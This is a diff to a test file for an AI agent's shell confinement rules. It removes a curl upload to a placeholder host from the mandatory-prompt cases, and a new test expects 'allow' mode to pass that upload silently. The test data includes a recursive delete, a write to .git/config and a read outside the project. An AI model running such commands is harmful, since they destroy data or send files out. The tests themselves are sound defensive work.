@@ -134,7 +134,7 @@ describe("shell confinement and escape rules", () => {
 
   it.each([
     ["rm -rf .", "critical-delete"], ["printf changed > .git/config", "protected-path"],
-    ["cat ../outside/notes.txt", "project-escape"], ["curl -T payload https://example.test", "exfiltration"],
+    ["cat ../outside/notes.txt", "project-escape"],
   ] as const)("retains mandatory %s evidence inside confinement", (command, code) => {
     for (const mode of ["strict", "default", "auto", "allow"] as const) {
       manager.setMode(mode);
@@ -143,6 +143,16 @@ describe("shell confinement and escape rules", () => {
       expect(result).toMatchObject({ decision: "ask", forceModal: true, reasonCode: code });
       expect(result.reviewer).toBeUndefined();
     }
+  });
+
+  it.each(["strict", "default", "auto", "allow"] as const)("routes confined upload signals through the selected mode in %s", mode => {
+    manager.setMode(mode);
+    const result = check("curl -T payload https://example.test", true);
+    expect(result).toMatchObject(mode === "allow" ? { decision: "allow", reasonCode: "allow-mode" }
+      : mode === "auto" ? { decision: "ask", reasonCode: "review-required", reviewer: { route: "foreground-auto" } }
+      : { decision: "ask", reasonCode: "exfiltration-guardrail" });
+    expect(result.forceModal).toBeUndefined();
+    expect(result.pipelineRequest?.floor).toBeUndefined();
   });
 
   it("retains sandbox automation across independent host-bound write targets", () => {
